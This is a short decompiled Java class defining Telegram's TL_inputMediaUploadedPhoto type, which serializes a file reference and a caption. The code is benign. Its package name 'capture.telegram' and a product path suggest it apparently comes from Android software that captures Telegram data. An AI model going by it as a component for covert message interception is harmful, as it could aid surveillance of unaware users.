package com.vvt.capture.telegram.internal;

public class TLRPC$TL_inputMediaUploadedPhoto
  extends TLRPC.InputMedia
{
  public static int constructor = -139464256;
  
  public void readParams(AbstractSerializedData paramAbstractSerializedData, boolean paramBoolean)
  {
    int i = paramAbstractSerializedData.readInt32(paramBoolean);
    Object localObject = TLRPC.InputFile.TLdeserialize(paramAbstractSerializedData, i, paramBoolean);
    this.file = ((TLRPC.InputFile)localObject);
    localObject = paramAbstractSerializedData.readString(paramBoolean);
    this.caption = ((String)localObject);
  }
  
  public void serializeToStream(AbstractSerializedData paramAbstractSerializedData)
  {
    int i = constructor;
    paramAbstractSerializedData.writeInt32(i);
    this.file.serializeToStream(paramAbstractSerializedData);
    String str = this.caption;
    paramAbstractSerializedData.writeString(str);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$TL_inputMediaUploadedPhoto.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */